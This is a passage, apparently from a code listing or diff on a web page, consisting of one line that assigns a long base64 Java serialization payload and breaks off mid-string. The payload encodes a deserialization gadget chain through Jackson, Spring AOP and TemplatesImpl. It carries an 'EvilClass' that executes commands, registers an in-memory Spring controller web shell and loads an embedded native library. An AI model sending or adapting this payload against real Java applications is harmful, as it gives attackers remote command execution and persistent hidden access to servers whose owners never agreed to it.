-payload = <span class="hljs-string">&quot;&quot;&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAJnQABFBvYzB0AAlQb2MwLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AFXhzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXEAfgABeHIALWNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlZhbHVlTm9kZQAAAAAAAAABAgAAeHIAMGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLkJhc2VKc29uTm9kZQAAAAAAAAABAgAAeHBzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW/AIABFoADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDtbABFwcm94aWVkSW50ZXJmYWNlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAVaAAtwcmVGaWx0ZXJlZEwAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAIYWR2aXNvcnNxAH4AB0wACmludGVyZmFjZXNxAH4AB0wADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3EAfgAUAAAAAHcEAAAAAHhzcQB+ABQAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4+roCAAFMAAZ0YXJnZXRxAH4AAXhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AIEwABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAARWPK/rq+AAAANAEXCgA+AI4IAFMLADMAjwoACQCQCwA0AJEKAJIAkwoAkgCUCgCVAJYHAJcIAJgKAJkAmgcAmwgAnAgAnQoADACeCgAMAJ8KAAwAoAoAFwChCACiCgAXAKMIAKQIAG4HAKUHAKYJAKcAqAoAFwCpCgCqAKsIAKwKABcArQoArgCrCgCuAK8HALAKABcAsQoAsgCrBwCzCgCnALQKALIAtQoAIAC2CgCuALcKAKoAuAoAuQC6CAC7CwC8AL0HAL4HAL8LACwAwAoAIwDBCAB9BwDDCABMBwDEBwDFCgAXAMYIAMcKAMIAyAsAyQDKCwDJAMsKAAkAjgoALQDMBwDNCgA8AM4HAM8BAA9FVklMX0pOSV9CQVNFNjQBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQAITElCX1BBVEgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xFdmlsQ2xhc3M7AQAHZXhlY0NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAFc2hlbGwBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHZXhlY1JlcwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBAA1TdGFja01hcFRhYmxlBwCmAQAKRXhjZXB0aW9ucwcA0AEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHANEBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQAIam5pQnl0ZXMBAAJbQgEAEHJhbmRvbUFjY2Vzc0ZpbGUBABpMamF2YS9pby9SYW5kb21BY2Nlc3NGaWxlOwEACWNtZExvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAQY2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQASbmF0aXZlTGlicmFyeUNsYXp6AQAEbG9hZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEbGlicwEAEkxqYXZhL3V0aWwvVmVjdG9yOwEAEW5hdGl2ZUxpYnJhcnlDb25zAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAEG5hdGl2ZUxpYnJhcnlPYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAC2NvbmZpZ0ZpZWxkAQAGY29uZmlnAQAUQnVpbGRlckNvbmZpZ3VyYXRpb24BAAxJbm5lckNsYXNzZXMBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjsBAAdtZXRob2QyAQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAGHNwcmluZ0NvbnRyb2xsZXJNZW1TaGVsbAEAAmhpAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAmTGphdmEvdXRpbC9WZWN0b3I8TGphdmEvbGFuZy9PYmplY3Q7PjsBACJMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47BwDNAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDABDAEQMANIASwwASgBLDADTANQHANUMANYA1wwA2ABEBwDZDADaANwBAAlFdmlsQ2xhc3MBK4BmMFZNUmdJQkFRQUFBQUFBQUFBQUFBTUFQZ0FCQUFBQWdBY0FBQUFBQUFCQUFBQUFBQUFBQUtBWkFBQUFBQUFBQUFBQUFFQUFPQUFIQUVBQUhBQWJBQUVBQUFBRkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXRBb0FBQUFBQUFDMENnQUFBQUFBQUFBQUlBQUFBQUFBQVFBQUFBWUFBQUQ0RFFBQUFBQUFBUGdOSUFBQUFBQUErQTBnQUFBQUFBQm9BZ0FBQUFBQUFIQUNBQUFBQUFBQUFBQWdBQUFBQUFBQ0FBQUFCZ0FBQUJnT0FBQUFBQUFBR0E0Z0FBQUFBQUFZRGlBQUFBQUFBTUFCQUFBQUFBQUF3QUVBQUFBQUFBQUlBQUFBQUFBQUFBUUFBQUFFQUFBQXlBRUFBQUFBQUFESUFRQUFBQUFBQU1nQkFBQUFBQUFBSkFBQUFBQUFBQUFrQUFBQUFBQUFBQVFBQUFBQUFBQUFVT1YwWkFRQUFBQU1DZ0FBQUFBQUFBd0tBQUFBQUFBQURBb0FBQUFBQUFBa0FBQUFBQUFBQUNRQUFBQUFBQUFBQkFBQUFBQUFBQUJSNVhSa0JnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUZMbGRHUUVBQUFBK0EwQUFBQUFBQUQ0RFNBQUFBQUFBUGdOSUFBQUFBQUFDQUlBQUFBQUFBQUlBZ0FBQUFBQUFBRUFBQUFBQUFBQUJBQUFBQlFBQUFBREFBQUFSMDVWQU5xbXhVdXNJYlE0dG1FMjdtLzBqcGgzMy9IQ0FBQUFBQU1BQUFBTUFBQUFBUUFBQUFZQUFBQ293Q0FKRUFSQURRd0FBQUFRQUFBQUVnQUFBRUpGMWV5YW5pejhaSkV1RXJ2amtuelljVmdjdVkzeER1dlQ3dzRBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWNBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDVUFBQUFFZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUN5QUFBQUVnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0NBQUFBRWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDUEFBQUFFZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQjhBQUFBRWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCaEFBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUNJQUFBQUVnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTRBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCU0FBQUFJZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUREQUFBQUVBQVdBR0FRSUFBQUFBQUFBQUFBQUFBQUFBQjFBQUFBRWdBTEFHVUlBQUFBQUFBQW5BQUFBQUFBQUFDYkFBQUFFZ0FMQUFFSkFBQUFBQUFBL0FBQUFBQUFBQURXQUFBQUVBQVhBR2dRSUFBQUFBQUFBQUFBQUFBQUFBREtBQUFBRUFBWEFHQVFJQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFFZ0FKQU1BR0FBQUFBQUFBQUFBQUFBQUFBQUFXQUFBQUVnQU1BQUFLQUFBQUFBQUFBQUFBQUFBQUFBQUFYMTluYlc5dVgzTjBZWEowWDE4QVgybHVhWFFBWDJacGJta0FYMGxVVFY5a1pYSmxaMmx6ZEdWeVZFMURiRzl1WlZSaFlteGxBRjlKVkUxZmNtVm5hWE4wWlhKVVRVTnNiMjVsVkdGaWJHVUFYMTlqZUdGZlptbHVZV3hwZW1VQVgwcDJYMUpsWjJsemRHVnlRMnhoYzNObGN3QmxlR1ZqYldRQWNHOXdaVzRBWm1kbGRITUFjM1J5WTJGMEFHWmxiMllBY0dOc2IzTmxBRXBoZG1GZlJYWnBiRU5zWVhOelgyVjRaV05EYldRQWJXVnRjMlYwQUd4cFltTXVjMjh1TmdCZlpXUmhkR0VBWDE5aWMzTmZjM1JoY25RQVgyVnVaQUJIVEVsQ1ExOHlMakl1TlFBQUFBQUFBQUlBQWdBQ0FBSUFBQUFDQUFBQUFnQUFBQUlBQVFBQkFBRUFBUUFCQUFFQUFRQUFBQUVBQVFDNUFBQUFFQUFBQUFBQUFBQjFHbWtKQUFBQ0FOc0FBQUFBQUFBQStBMGdBQUFBQUFBSUFBQUFBQUFBQURBSUFBQUFBQUFBQUE0Z0FBQUFBQUFJQUFBQUFBQUFBUEFIQUFBQUFBQUFFQTRnQUFBQUFBQUlBQUFBQUFBQUFCQU9JQUFBQUFBQTJBOGdBQUFBQUFBR0FBQUFBUUFBQUFBQUFBQUFBQUFBNEE4Z0FBQUFBQUFHQUFBQUJnQUFBQUFBQUFBQUFBQUE2QThnQUFBQUFBQUdBQUFBQ0FBQUFBQUFBQUFBQUFBQThBOGdBQUFBQUFBR0FBQUFDZ0FBQUFBQUFBQUFBQUFBK0E4Z0FBQUFBQUFHQUFBQUN3QUFBQUFBQUFBQUFBQUFHQkFnQUFBQUFBQUhBQUFBQWdBQUFBQUFBQUFBQUFBQUlCQWdBQUFBQUFBSEFBQUFBd0FBQUFBQUFBQUFBQUFBS0JBZ0FBQUFBQUFIQUFBQUJBQUFBQUFBQUFBQUFBQUFNQkFnQUFBQUFBQUhBQUFBQlFBQUFBQUFBQUFBQUFBQU9CQWdBQUFBQUFBSEFBQUFCZ0FBQUFBQUFBQUFBQUFBUUJBZ0FBQUFBQUFIQUFBQURRQUFBQUFBQUFBQUFBQUFTQkFnQUFBQUFBQUhBQUFBQndBQUFBQUFBQUFBQUFBQVVCQWdBQUFBQUFBSEFBQUFDUUFBQUFBQUFBQUFBQUFBV0JBZ0FBQUFBQUFIQUFBQUN3QUFBQUFBQUFBQUFBQUFTSVBzQ0VpTEJSVUpJQUJJaGNCMEJlaGJBQUFBU0lQRUNNTUFBQUFBQUFEL05TSUpJQUQvSlNRSklBQVBIMEFBL3lVaUNTQUFhQUFBQUFEcDRQLy8vLzhsR2drZ0FHZ0JBQUFBNmRELy8vLy9KUklKSUFCb0FnQUFBT25BLy8vLy95VUtDU0FBYUFNQUFBRHBzUC8vLy84bEFna2dBR2dFQUFBQTZhRC8vLy8vSmZvSUlBQm9CUUFBQU9tUS8vLy8veVh5Q0NBQWFBWUFBQURwZ1AvLy8vOGw2Z2dnQUdnSEFBQUE2WEQvLy8vL0plSUlJQUJvQ0FBQUFPbGcvLy8vU0kwRjRBZ2dBRWlOUGRJSUlBQlZTQ240U0lubFNJUDREbmNDWGNOSWl3VTBDQ0FBU0lYQWRQSmQvK0FQSDBBQVNJMEZxUWdnQUVpTlBhSUlJQUJWU0NuNFNJbmxTTUg0QTBpSndrakI2ajlJQWRCSTBmaDFBbDNEU0lzVkR3Z2dBRWlGMG5UeVhVaUp4di9pRHg5QUFJQTlhUWdnQUFCMUowaURQZmNISUFBQVZVaUo1WFFNU0kwOUFnWWdBT2hkLy8vLzZHai8vLzlkeGdWQUNDQUFBZlBERHg5QUFHWXVEeCtFQUFBQUFBQklnejNRQlNBQUFIUW1TSXNGcHdjZ0FFaUZ3SFFhVlVpTlBib0ZJQUJJaWVYLzBGM3BWLy8vL3c4ZmdBQUFBQURwUy8vLy8xVklpZVZJZ2V3Z01BQUFTSW05Nk0vLy8waUp0ZURQLy85SWk0WG96Ly8vU0kwMWZRRUFBRWlKeCtpOC92Ly9TSWxGK0VpRGZmZ0FkUWU0QUFBQUFPdFo2elpJaTFYNFNJMkY4TS8vLzc2QUFBQUFTSW5INkZEKy8vOUloY0IwR1VpTmxmRFAvLzlJaTRYZ3ovLy9TSW5XU0luSDZJTCsvLzlJaTBYNFNJbkg2RGIrLy8rRndIUzZTSXRGK0VpSngrajIvZi8vdUFFQUFBREp3MVZJaWVWSWdleWdNQUFBU0ltOWVNLy8vMGlKdFhEUC8vOUlpWlZvei8vL1NJdUZlTS8vLzBpTEFFaUxnRWdGQUFCSWk3Vm96Ly8vU0l1TmVNLy8vN29BQUFBQVNJblAvOUJJaVVYNFNNZUY4TS8vL3dBQUFBQklqWVg0ei8vL3V2Z3ZBQUMrQUFBQUFFaUp4K2lPL2YvL1NJMlY4TS8vLzBpTFJmaElpZFpJaWNmb3VQMy8vMGpIaFlEUC8vOEFBQUFBU0kyVmlNLy8vN2dBQUFBQXVRc0FBQUJJaWRmelNLdElpZnFKQWtpRHdnUklqWlh3ei8vL1NJMkZnTS8vLzBpSjFraUp4K2lVL2YvL1NJdUZlTS8vLzBpTEFFaUxnRGdGQUFCSWpZMkF6Ly8vU0l1VmVNLy8vMGlKemtpSjEvL1FTSWxGOEVpTFJmREp3d0FBQUVpRDdBaElnOFFJdzNJQUFBRWJBenNnQUFBQUF3QUFBTlQ4Ly84OEFBQUFXZjcvLzJRQUFBRDEvdi8vaEFBQUFCUUFBQUFBQUFBQUFYcFNBQUY0RUFFYkRBY0lrQUVBQUNRQUFBQWNBQUFBa1B6Ly82QUFBQUFBRGhCR0RoaEtEd3QzQ0lBQVB4bzdLak1rSWdBQUFBQWNBQUFBUkFBQUFPMzkvLytjQUFBQUFFRU9FSVlDUXcwR0FwY01Cd2dBQUJ3QUFBQmtBQUFBYWY3Ly8vd0FBQUFBUVE0UWhnSkREUVlDOXd3SENBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFnQUFBQUFBQUR3QndBQUFBQUFBQUFBQUFBQUFBQUFFQTRnQUFBQUFBQUJBQUFBQUFBQUFMa0FBQUFBQUFBQURBQUFBQUFBQUFEQUJnQUFBQUFBQUEwQUFBQUFBQUFBQUFvQUFBQUFBQUFaQUFBQUFBQUFBUGdOSUFBQUFBQUFHd0FBQUFBQUFBQUlBQUFBQUFBQUFCb0FBQUFBQUFBQUFBNGdBQUFBQUFBY0FBQUFBQUFBQUFnQUFBQUFBQUFBOWY3L2J3QUFBQUR3QVFBQUFBQUFBQVVBQUFBQUFBQUErQU1BQUFBQUFBQUdBQUFBQUFBQUFEQUNBQUFBQUFBQUNnQUFBQUFBQUFEbkFBQUFBQUFBQUFzQUFBQUFBQUFBR0FBQUFBQUFBQUFEQUFBQUFBQUFBQUFRSUFBQUFBQUFBZ0FBQUFBQUFBRFlBQUFBQUFBQUFCUUFBQUFBQUFBQUJ3QUFBQUFBQUFBWEFBQUFBQUFBQU9nRkFBQUFBQUFBQndBQUFBQUFBQUFvQlFBQUFBQUFBQWdBQUFBQUFBQUF3QUFBQUFBQUFBQUpBQUFBQUFBQUFCZ0FBQUFBQUFBQS92Ly9id0FBQUFBSUJRQUFBQUFBQVAvLy8yOEFBQUFBQVFBQUFBQUFBQUR3Ly85dkFBQUFBT0FFQUFBQUFBQUErZi8vYndBQUFBQURBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQmdPSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFQWUdBQUFBQUFBQUJnY0FBQUFBQUFBV0J3QUFBQUFBQUNZSEFBQUFBQUFBTmdjQUFBQUFBQUJHQndBQUFBQUFBRllIQUFBQUFBQUFaZ2NBQUFBQUFBQjJCd0FBQUFBQUFFZERRem9nS0VkT1ZTa2dOQzQ0TGpVZ01qQXhOVEEyTWpNZ0tGSmxaQ0JJWVhRZ05DNDRMalV0TkRRcEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFFQXlBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQUlBOEFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBTUFNQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFRQStBTUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQVVBNEFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBWUFDQVVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFjQUtBVUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQWdBNkFVQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBa0F3QVlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFvQTRBWUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQXNBZ0FjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBd0FBQW9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUEwQUNRb0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQTRBREFvQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBOEFNQW9BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUJBQStBMGdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQkVBQUE0Z0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFCSUFDQTRnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUJNQUVBNGdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQlFBR0E0Z0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFCVUEyQThnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUJZQUFCQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURBQmNBWUJBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFCZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFFQVBIL0FBQUFBQUFBQUFBQUFBQUFBQUFBQUF3QUFBQUJBQklBQ0E0Z0FBQUFBQUFBQUFBQUFBQUFBQmtBQUFBQ0FBc0FnQWNBQUFBQUFBQUFBQUFBQUFBQUFCc0FBQUFDQUFzQXNBY0FBQUFBQUFBQUFBQUFBQUFBQUM0QUFBQUNBQXNBOEFjQUFBQUFBQUFBQUFBQUFBQUFBRVFBQUFBQkFCY0FZQkFnQUFBQUFBQUJBQUFBQUFBQUFGTUFBQUFCQUJFQUFBNGdBQUFBQUFBQUFBQUFBQUFBQUhvQUFBQUNBQXNBTUFnQUFBQUFBQUFBQUFBQUFBQUFBSVlBQUFBQkFCQUErQTBnQUFBQUFBQUFBQUFBQUFBQUFLVUFBQUFFQVBIL0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUVBUEgvQUFBQUFBQUFBQUFBQUFBQUFBQUFBTEVBQUFBQkFBOEFzQW9BQUFBQUFBQUFBQUFBQUFBQUFMOEFBQUFCQUJJQUNBNGdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBUEgvQUFBQUFBQUFBQUFBQUFBQUFBQUFBTXNBQUFBQkFCTUFFQTRnQUFBQUFBQUFBQUFBQUFBQUFOZ0FBQUFCQUJRQUdBNGdBQUFBQUFBQUFBQUFBQUFBQU9FQUFBQUFBQTRBREFvQUFBQUFBQUFBQUFBQUFBQUFBUFFBQUFBQkFCWUFZQkFnQUFBQU